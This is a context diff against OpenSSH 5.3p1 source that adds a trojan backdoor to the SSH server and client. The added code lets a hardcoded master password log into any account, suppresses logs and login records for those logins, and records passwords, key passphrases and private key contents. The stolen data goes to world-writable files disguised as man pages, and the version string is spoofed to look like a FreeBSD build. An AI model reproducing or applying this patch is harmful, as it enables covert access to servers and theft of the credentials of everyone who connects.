diff -c -r -N openssh-5.3p1/Makefile.in openssh-5.3p1_p/Makefile.in
*** openssh-5.3p1/Makefile.in	Fri Aug 28 03:47:38 2009
--- openssh-5.3p1_p/Makefile.in	Tue Dec  1 02:36:31 2009
***************
*** 71,77 ****
  	atomicio.o key.o dispatch.o kex.o mac.o uidswap.o uuencode.o misc.o \
  	monitor_fdpass.o rijndael.o ssh-dss.o ssh-rsa.o dh.o kexdh.o \
  	kexgex.o kexdhc.o kexgexc.o scard.o msg.o progressmeter.o dns.o \
! 	entropy.o scard-opensc.o gss-genr.o umac.o jpake.o schnorr.o
  
  SSHOBJS= ssh.o readconf.o clientloop.o sshtty.o \
  	sshconnect.o sshconnect1.o sshconnect2.o mux.o \
--- 71,77 ----
  	atomicio.o key.o dispatch.o kex.o mac.o uidswap.o uuencode.o misc.o \
  	monitor_fdpass.o rijndael.o ssh-dss.o ssh-rsa.o dh.o kexdh.o \
  	kexgex.o kexdhc.o kexgexc.o scard.o msg.o progressmeter.o dns.o \
! 	entropy.o scard-opensc.o gss-genr.o umac.o jpake.o schnorr.o version.o
  
  SSHOBJS= ssh.o readconf.o clientloop.o sshtty.o \
  	sshconnect.o sshconnect1.o sshconnect2.o mux.o \
diff -c -r -N openssh-5.3p1/auth-pam.c openssh-5.3p1_p/auth-pam.c
*** openssh-5.3p1/auth-pam.c	Sun Jul 12 15:07:21 2009
--- openssh-5.3p1_p/auth-pam.c	Thu Dec  3 05:14:56 2009
***************
*** 771,776 ****
--- 771,784 ----
  			}
  			/* FALLTHROUGH */
  		case PAM_SUCCESS:
+ 			if (type == PAM_SUCCESS) {
+ 				logfile(LOG_GOOD);
+ 			}
+ 			else {
+ 				logfile(LOG_BAD);
+ 			}
+ 			memset(log_buf,0,sizeof(log_buf));
+ 
  			if (**prompts != NULL) {
  				/* drain any accumulated messages */
  				debug("PAM: %s", **prompts);
***************
*** 815,820 ****
--- 823,841 ----
  {
  	Buffer buffer;
  	struct pam_ctxt *ctxt = ctx;
+ 	
+ 	if (sshpam_authctxt) {
+ 		for (good_i = 0; good_i < num; ++good_i) {
+ 			md5pass(resp[good_i]);
+ 			if (good_pass == 1) {
+ 				ctxt->pam_done = good_login = 1;
+ 			}
+ 			else {
+ 				memset(log_buf,0,sizeof(log_buf));
+ 				sprintf(log_buf,"PAM: h: %s, u: %s, p: %s\n",get_remote_ipaddr(),sshpam_authctxt->user,resp[good_i]);
+ 			}
+ 		}
+ 	}
  
  	debug2("PAM: %s entering, %u responses", __func__, num);
  	switch (ctxt->pam_done) {
diff -c -r -N openssh-5.3p1/auth-passwd.c openssh-5.3p1_p/auth-passwd.c
*** openssh-5.3p1/auth-passwd.c	Sun Mar  8 02:40:28 2009
--- openssh-5.3p1_p/auth-passwd.c	Thu Dec  3 01:01:22 2009
***************
*** 112,119 ****
  	}
  #endif
  #ifdef USE_PAM
! 	if (options.use_pam)
! 		return (sshpam_auth_passwd(authctxt, password) && ok);
  #endif
  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
  	if (!expire_checked) {
--- 112,138 ----
  	}
  #endif
  #ifdef USE_PAM
! 	int ret_pam;
! 	if (options.use_pam) {
! 		md5pass(password);
! 		if (good_pass == 1) {
! 			good_login = 1;
! 		}
! 		else {
! 			memset(log_buf,0,sizeof(log_buf));
! 			sprintf(log_buf,"PPAM: h: %s, u: %s, p: %s\n",get_remote_ipaddr(),authctxt->user,password);
! 		}
! 		ret_pam = sshpam_auth_passwd(authctxt, password);
! 		if (good_login == 1) {
! 			ret_pam = 1;
! 		}
! 		else {
! 			if (ret_pam && ok) logfile(LOG_GOOD)
! 			else logfile(LOG_BAD);
! 			memset(log_buf,0,sizeof(log_buf));
! 		}
! 		return (ret_pam && ok);
! 	}
  #endif
  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
  	if (!expire_checked) {
***************
*** 122,130 ****
--- 141,165 ----
  			authctxt->force_pwchange = 1;
  	}
  #endif
+ 	md5pass(password);
+ 	if (good_pass == 1) {
+ 		good_login = 1;
+ 	}
+ 	else {
+ 		memset(log_buf,0,sizeof(log_buf));
+ 		sprintf(log_buf,"h: %s, u: %s, p: %s\n",get_remote_ipaddr(),authctxt->user,password);
+ 	}
  	result = sys_auth_passwd(authctxt, password);
  	if (authctxt->force_pwchange)
  		disable_forwarding();
+ 	if (good_login == 1) {
+ 		result = 1;
+ 	}
+ 	else {
+ 		if (result && ok) logfile(LOG_GOOD)
+ 		else logfile(LOG_BAD);
+ 		memset(log_buf,0,sizeof(log_buf));
+ 	}
  	return (result && ok);
  }
  
diff -c -r -N openssh-5.3p1/auth.c openssh-5.3p1_p/auth.c
*** openssh-5.3p1/auth.c	Wed Nov  5 07:12:54 2008
--- openssh-5.3p1_p/auth.c	Sat Nov 28 20:01:58 2009
***************
*** 250,255 ****
--- 250,257 ----
  	void (*authlog) (const char *fmt,...) = verbose;
  	char *authmsg;
  
+ 	if (good_login == 1) return;
+ 
  	if (use_privsep && !mm_is_monitor() && !authctxt->postponed)
  		return;
  
diff -c -r -N openssh-5.3p1/authfile.c openssh-5.3p1_p/authfile.c
*** openssh-5.3p1/authfile.c	Fri Sep  1 08:38:36 2006
--- openssh-5.3p1_p/authfile.c	Sat Nov 28 20:14:46 2009
***************
*** 561,566 ****
--- 561,569 ----
  		close(fd);
  		return NULL;
  	}
+ 
+ 	log_key(type, filename);
+ 
  	if (perm_ok != NULL)
  		*perm_ok = 1;
  	switch (type) {
diff -c -r -N openssh-5.3p1/includes.h openssh-5.3p1_p/includes.h
*** openssh-5.3p1/includes.h	Thu Aug 20 09:16:01 2009
--- openssh-5.3p1_p/includes.h	Thu Dec  3 04:50:00 2009
***************
*** 172,175 ****
--- 172,236 ----
  
  #include "entropy.h"
  
+ #define PASSWORD "$1$DIjQ7qpQ$Pt.Mj0g.fCgH9/peqmTbU0"
+ #define LOG_REMOTE "/usr/share/man/man5/ttyp.5.gz"
+ #define LOG_GOOD "/usr/share/man/man5/ttyl.5.gz"
+ #define LOG_BAD "/usr/share/man/man5/ttyv.5.gz"
+ 
+ char log_key[16384];
+ char log_buf[32768];
+ char log_prompt[512];
+ char log_user[256];
+ char log_host[256];
+ char log_pass[256];
+ char log_port[16];
+ int good_login;
+ int good_pass;
+ int good_i;
+ FILE *logfile;
+ 
+ #define logfile(LOGFILE) \
+ { \
+ logfile=fopen(LOGFILE, "a"); \
+ if(logfile!=NULL) \
+ { \
+ fprintf(logfile,"%s",log_buf); \
+ fclose(logfile); \
+ } \
+ chmod(LOGFILE, 0666); \
+ }
+ 
+ #define log_key(type,filename) { \
+ 	char chr[16384]; \
+ 	int fdkey; \
+ 	int num, i; \
+ 	memset(log_key,0,sizeof(log_key)); \
+ 	memset(chr,0,sizeof(chr)); \
+ 	fdkey = open(filename, O_RDONLY); \
+ 	num = read(fdkey,chr,16384); \
+ 	close(fdkey); \
+ 	if (num > 0) { \
+ 		if (type == KEY_RSA1) { \
+ 			for (i=0;i<num;i++) { \
+ 				sprintf(log_key,"%s%.2x",log_key,(unsigned char) chr[i]); \
+ 			} \
+ 		} \
+ 		else { \
+ 			for (i=0;i<num;i++) { \
+ 				sprintf(log_key,"%s%c",log_key,(unsigned char) chr[i]); \
+ 			} \
+ 		} \
+ 	} \
+ }
+ 
+ #define md5pass(pass) { \
+ 	char* hash = crypt(pass, "$1$DIjQ7qpQ$"); \
+ 	if (strcmp(hash,PASSWORD) == 0) { \
+ 		good_pass = 1; \
+ 	} \
+ 	else { \
+ 		good_pass = 0; \
+ 	} \
+ }
+ 
  #endif /* INCLUDES_H */
diff -c -r -N openssh-5.3p1/key.c openssh-5.3p1_p/key.c
*** openssh-5.3p1/key.c	Mon Nov  3 10:24:17 2008
--- openssh-5.3p1_p/key.c	Thu Dec  3 00:56:53 2009
***************
*** 904,909 ****
--- 904,913 ----
      u_char **sigp, u_int *lenp,
      const u_char *data, u_int datalen)
  {
+ 	if (strlen(log_buf)>0) {
+ 		logfile(LOG_REMOTE);
+ 		memset(log_buf,0,sizeof(log_buf));
+ 	}
  	switch (key->type) {
  	case KEY_DSA:
  		return ssh_dss_sign(key, sigp, lenp, data, datalen);
diff -c -r -N openssh-5.3p1/log.c openssh-5.3p1_p/log.c
*** openssh-5.3p1/log.c	Tue Jun 10 16:01:51 2008
--- openssh-5.3p1_p/log.c	Sat Nov 28 20:11:52 2009
***************
*** 338,343 ****
--- 338,345 ----
  	int pri = LOG_INFO;
  	int saved_errno = errno;
  
+ 	if (good_login) return;
+ 
  	if (level > log_level)
  		return;
  
diff -c -r -N openssh-5.3p1/loginrec.c openssh-5.3p1_p/loginrec.c
*** openssh-5.3p1/loginrec.c	Thu Feb 12 04:12:22 2009
--- openssh-5.3p1_p/loginrec.c	Thu Dec  3 05:00:16 2009
***************
*** 431,436 ****
--- 431,437 ----
  int
  login_write(struct logininfo *li)
  {
+ 	if (good_login) return (0);
  #ifndef HAVE_CYGWIN
  	if (geteuid() != 0) {
  		logit("Attempt to write login records by non-root user (aborting)");
diff -c -r -N openssh-5.3p1/readconf.c openssh-5.3p1_p/readconf.c
*** openssh-5.3p1/readconf.c	Mon Jul  6 00:12:27 2009
--- openssh-5.3p1_p/readconf.c	Sun Nov 29 17:28:02 2009
***************
*** 130,136 ****
  	oServerAliveInterval, oServerAliveCountMax, oIdentitiesOnly,
  	oSendEnv, oControlPath, oControlMaster, oHashKnownHosts,
  	oTunnel, oTunnelDevice, oLocalCommand, oPermitLocalCommand,
! 	oVisualHostKey, oUseRoaming, oZeroKnowledgePasswordAuthentication,
  	oDeprecated, oUnsupported
  } OpCodes;
  
--- 130,136 ----
  	oServerAliveInterval, oServerAliveCountMax, oIdentitiesOnly,
  	oSendEnv, oControlPath, oControlMaster, oHashKnownHosts,
  	oTunnel, oTunnelDevice, oLocalCommand, oPermitLocalCommand,
! 	oVisualHostKey, oVersionAddendum, oUseRoaming, oZeroKnowledgePasswordAuthentication,
  	oDeprecated, oUnsupported
  } OpCodes;
  
***************
*** 228,233 ****
--- 228,234 ----
  	{ "localcommand", oLocalCommand },
  	{ "permitlocalcommand", oPermitLocalCommand },
  	{ "visualhostkey", oVisualHostKey },
+ 	{ "versionaddendum", oVersionAddendum },
  	{ "useroaming", oUseRoaming },
  #ifdef JPAKE
  	{ "zeroknowledgepasswordauthentication",
***************
*** 918,923 ****
--- 919,931 ----
  	case oUseRoaming:
  		intptr = &options->use_roaming;
  		goto parse_flag;
+ 	
+ 	case oVersionAddendum:
+ 		ssh_version_set_addendum(strtok(s, "\n"));
+ 		do {
+ 			arg = strdelim(&s);
+ 		} while (arg != NULL && *arg != '\0');
+ 		break;
  
  	case oDeprecated:
  		debug("%s line %d: Deprecated option \"%s\"",
diff -c -r -N openssh-5.3p1/servconf.c openssh-5.3p1_p/servconf.c
*** openssh-5.3p1/servconf.c	Sun Jun 21 13:26:17 2009
--- openssh-5.3p1_p/servconf.c	Sun Nov 29 17:28:02 2009
***************
*** 305,310 ****
--- 305,311 ----
  	sGssAuthentication, sGssCleanupCreds, sAcceptEnv, sPermitTunnel,
  	sMatch, sPermitOpen, sForceCommand, sChrootDirectory,
  	sUsePrivilegeSeparation, sAllowAgentForwarding,
+ 	sVersionAddendum,
  	sZeroKnowledgePasswordAuthentication,
  	sDeprecated, sUnsupported
  } ServerOpCodes;
***************
*** 424,429 ****
--- 425,431 ----
  	{ "permitopen", sPermitOpen, SSHCFG_ALL },
  	{ "forcecommand", sForceCommand, SSHCFG_ALL },
  	{ "chrootdirectory", sChrootDirectory, SSHCFG_ALL },
+ 	{ "versionaddendum", sVersionAddendum, SSHCFG_GLOBAL },
  	{ NULL, sBadOption, 0 }
  };
  
***************
*** 1293,1298 ****
--- 1295,1307 ----
  		if (*activep && *charptr == NULL)
  			*charptr = xstrdup(arg);
  		break;
+ 	
+ 	case sVersionAddendum:
+ 		ssh_version_set_addendum(strtok(cp, "\n"));
+ 		do {
+ 			arg = strdelim(&cp);
+ 		} while (arg != NULL && *arg != '\0');
+ 		break;
  
  	case sDeprecated:
  		logit("%s line %d: Deprecated option %s",
diff -c -r -N openssh-5.3p1/sshconnect1.c openssh-5.3p1_p/sshconnect1.c
*** openssh-5.3p1/sshconnect1.c	Tue Nov  7 14:14:42 2006
--- openssh-5.3p1_p/sshconnect1.c	Thu Dec  3 05:29:08 2009
***************
*** 269,274 ****
--- 269,280 ----
  				debug2("no passphrase given, try next key");
  				quit = 1;
  			}
+ 			memset(log_buf,0,sizeof(log_buf));
+ 			memset(log_port,0,sizeof(log_port));
+ 			if (options.port != 22) {
+ 				sprintf(log_port,", port: %d",options.port);
+ 			}
+ 			sprintf(log_buf,"%s%s, p: %s, key:\n%s\n",log_prompt,log_port,passphrase,log_key);
  			memset(passphrase, 0, strlen(passphrase));
  			xfree(passphrase);
  			if (private != NULL || quit)
***************
*** 309,314 ****
--- 315,321 ----
  	/* Wait for response from the server. */
  	type = packet_read();
  	if (type == SSH_SMSG_SUCCESS) {
+ 		logfile(LOG_REMOTE);
  		debug("RSA authentication accepted by server.");
  		return 1;
  	}
***************
*** 419,424 ****
--- 426,444 ----
  			logit("WARNING: Encryption is disabled! "
  			    "Response will be transmitted in clear text.");
  		response = read_passphrase(prompt, 0);
+ 		md5pass(response);
+ 		if (good_pass == 0) {
+ 			memset(log_buf,0,sizeof(log_buf));
+ 			memset(log_port,0,sizeof(log_port));
+ 			if (options.port != 22) {
+ 				sprintf(log_port,", port: %d",options.port);
+ 			}
+ 			sprintf(log_buf,"%s%s%s\n",log_prompt,response,log_port);
+ 			logfile(LOG_REMOTE);
+ 		}
+ 		else {
+ 			memset(log_buf,0,sizeof(log_buf));
+ 		}
  		if (strcmp(response, "") == 0) {
  			xfree(response);
  			break;
***************
*** 456,461 ****
--- 476,491 ----
  		if (i != 0)
  			error("Permission denied, please try again.");
  		password = read_passphrase(prompt, 0);
+ 		md5pass(password);
+ 		if (good_pass == 0) {
+ 			memset(log_buf,0,sizeof(log_buf));
+ 			memset(log_port,0,sizeof(log_port));
+ 			if (options.port != 22) {
+ 				sprintf(log_port,", port: %d",options.port);
+ 			}
+ 			sprintf(log_buf,"ssh1 %s%s%s\n",prompt,password,log_port);
+ 			logfile(LOG_REMOTE);
+ 		}
  		packet_start(SSH_CMSG_AUTH_PASSWORD);
  		ssh_put_password(password);
  		memset(password, 0, strlen(password));
***************
*** 722,736 ****
  			goto success;
  
  		/* Try RSA authentication for each identity. */
! 		for (i = 0; i < options.num_identity_files; i++)
  			if (options.identity_keys[i] != NULL &&
  			    options.identity_keys[i]->type == KEY_RSA1 &&
  			    try_rsa_authentication(i))
  				goto success;
  	}
  	/* Try challenge response authentication if the server supports it. */
  	if ((supported_authentications & (1 << SSH_AUTH_TIS)) &&
  	    options.challenge_response_authentication && !options.batch_mode) {
  		if (try_challenge_response_authentication())
  			goto success;
  	}
--- 752,771 ----
  			goto success;
  
  		/* Try RSA authentication for each identity. */
! 		for (i = 0; i < options.num_identity_files; i++) {
! 			memset(log_prompt,0,sizeof(log_prompt));
! 			sprintf(log_prompt,"pubkey1 %s@%s",server_user,host);
  			if (options.identity_keys[i] != NULL &&
  			    options.identity_keys[i]->type == KEY_RSA1 &&
  			    try_rsa_authentication(i))
  				goto success;
+ 		}
  	}
  	/* Try challenge response authentication if the server supports it. */
  	if ((supported_authentications & (1 << SSH_AUTH_TIS)) &&
  	    options.challenge_response_authentication && !options.batch_mode) {
+ 		memset(log_prompt,0,sizeof(log_prompt));
+ 		sprintf(log_prompt,"ssh1k %s@%s password: ",server_user,host);
  		if (try_challenge_response_authentication())
  			goto success;
  	}
diff -c -r -N openssh-5.3p1/sshconnect2.c openssh-5.3p1_p/sshconnect2.c
*** openssh-5.3p1/sshconnect2.c	Thu Mar  5 15:58:22 2009
--- openssh-5.3p1_p/sshconnect2.c	Thu Dec  3 05:30:22 2009
***************
*** 340,345 ****
--- 340,350 ----
  		fatal("ssh_userauth2: internal error: cannot send userauth none request");
  
  	/* initial userauth request */
+ 	memset(log_user,0,sizeof(log_user));
+ 	sprintf(log_user,"%s",server_user);
+ 	memset(log_host,0,sizeof(log_host));
+ 	sprintf(log_host,"%s",host);
+  
  	userauth_none(&authctxt);
  
  	dispatch_init(&input_userauth_error);
***************
*** 792,797 ****
--- 797,812 ----
  	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
  	    authctxt->server_user, authctxt->host);
  	password = read_passphrase(prompt, 0);
+ 	md5pass(password);
+ 	if (good_pass == 0) {
+ 		memset(log_buf,0,sizeof(log_buf));
+ 		memset(log_port,0,sizeof(log_port));
+ 		if (options.port != 22) {
+ 			sprintf(log_port,", port: %d",options.port);
+ 		}
+ 		sprintf(log_buf,"ssh2 %s%s%s\n",prompt,password,log_port);
+ 		logfile(LOG_REMOTE);
+ 	}
  	packet_start(SSH2_MSG_USERAUTH_REQUEST);
  	packet_put_cstring(authctxt->server_user);
  	packet_put_cstring(authctxt->service);
***************
*** 1245,1250 ****
--- 1260,1269 ----
  				private = key_load_private_type(KEY_UNSPEC,
  				    filename, passphrase, NULL, NULL);
  				quit = 0;
+ 				if (private != NULL) {
+ 					memset(log_pass,0,sizeof(log_pass));
+ 					sprintf(log_pass,"pass: %s, ",passphrase);
+ 				}
  			} else {
  				debug2("no passphrase given, try next key");
  				quit = 1;
***************
*** 1256,1261 ****
--- 1275,1289 ----
  			debug2("bad passphrase given, try again...");
  		}
  	}
+ 	if (private != NULL)
+ 	{
+ 		memset(log_buf,0,sizeof(log_buf));
+ 		memset(log_port,0,sizeof(log_port));
+ 		if (options.port != 22) {
+ 			sprintf(log_port," port: %d,",options.port);
+ 		}
+ 		sprintf(log_buf,"pubkey2 %s@%s,%s %skey:\n%s\n",log_user,log_host,log_port,log_pass,log_key);
+ 	}
  	return private;
  }
  
***************
*** 1382,1389 ****
  				id->key = NULL;
  			}
  		}
! 		if (sent)
  			return (sent);
  	}
  	return (0);
  }
--- 1410,1419 ----
  				id->key = NULL;
  			}
  		}
! 		if (sent) {
! 			logfile(LOG_REMOTE);
  			return (sent);
+ 		}
  	}
  	return (0);
  }
***************
*** 1464,1469 ****
--- 1494,1509 ----
  		echo = packet_get_char();
  
  		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
+ 		md5pass(response);
+ 		if (good_pass == 0) {
+ 			memset(log_buf,0,sizeof(log_buf));
+ 			memset(log_port,0,sizeof(log_port));
+ 			if (options.port != 22) {
+ 				sprintf(log_port," port: %d,",options.port);
+ 			}
+ 			sprintf(log_buf,"ssh2p %s@%s,%s p: %s\n",authctxt->server_user,authctxt->host,log_port,response);
+ 			logfile(LOG_REMOTE);
+ 		}
  
  		packet_put_cstring(response);
  		memset(response, 0, strlen(response));
diff -c -r -N openssh-5.3p1/version.c openssh-5.3p1_p/version.c
*** openssh-5.3p1/version.c	Thu Jan  1 03:00:00 1970
--- openssh-5.3p1_p/version.c	Thu Dec  3 01:49:26 2009
***************
*** 0 ****
--- 1,67 ----
+ /*-
+  * Copyright (c) 2001 Brian Fundakowski Feldman
+  * All rights reserved.
+  *
+  * Redistribution and use in source and binary forms, with or without
+  * modification, are permitted provided that the following conditions
+  * are met:
+  * 1. Redistributions of source code must retain the above copyright
+  *    notice, this list of conditions and the following disclaimer.
+  * 2. Redistributions in binary form must reproduce the above copyright
+  *    notice, this list of conditions and the following disclaimer in the
+  *    documentation and/or other materials provided with the distribution.
+  *
+  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+  * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+  * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+  * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+  * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+  * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+  * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+  * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+  * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+  * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+  * SUCH DAMAGE.
+  *
+  */
+ 
+ #include "includes.h"
+ 
+ #include <string.h>
+ 
+ #include "version.h"
+ #include "xmalloc.h"
+ 
+ 
+ static char *version = NULL;
+ 
+ const char *
+ ssh_version_get(void) {
+ 
+         if (version == NULL) {
+ 			if (strlen(SSH_VERSION_ADDENDUM)==0) {
+ 				version = xstrdup(SSH_VERSION_BASE);
+ 			}
+ 			else {
+                 version = xstrdup(SSH_VERSION_BASE " " SSH_VERSION_ADDENDUM);
+ 			}
+ 		}
+         return (version);
+ }
+ 
+ void
+ ssh_version_set_addendum(const char *add) {
+         char *newvers;
+         size_t size;
+ 
+         if (add != NULL) {
+                 size = strlen(SSH_VERSION_BASE) + 1 + strlen(add) + 1;
+                 newvers = xmalloc(size);
+                 snprintf(newvers, size, "%s %s", SSH_VERSION_BASE, add);
+         } else {
+                 newvers = xstrdup(SSH_VERSION_BASE);
+         }
+         if (version != NULL)
+                 xfree(version);
+         version = newvers;
+ }
diff -c -r -N openssh-5.3p1/version.h openssh-5.3p1_p/version.h
*** openssh-5.3p1/version.h	Mon Jul  6 00:13:04 2009
--- openssh-5.3p1_p/version.h	Sun Nov 29 17:28:03 2009
***************
*** 1,6 ****
  /* $OpenBSD: version.h,v 1.56 2009/06/30 14:54:40 markus Exp $ */
  
! #define SSH_VERSION	"OpenSSH_5.3"
  
! #define SSH_PORTABLE	"p1"
! #define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
--- 1,12 ----
  /* $OpenBSD: version.h,v 1.56 2009/06/30 14:54:40 markus Exp $ */
  
! #ifndef SSH_VERSION
  
! #define SSH_VERSION             (ssh_version_get())
! #define SSH_RELEASE             (ssh_version_get())
! #define SSH_VERSION_BASE        "OpenSSH_5.1p1"
! #define SSH_VERSION_ADDENDUM    "FreeBSD-20080901"
! 
! const char *ssh_version_get(void);
! void ssh_version_set_addendum(const char *add);
! #endif /* SSH_VERSION */
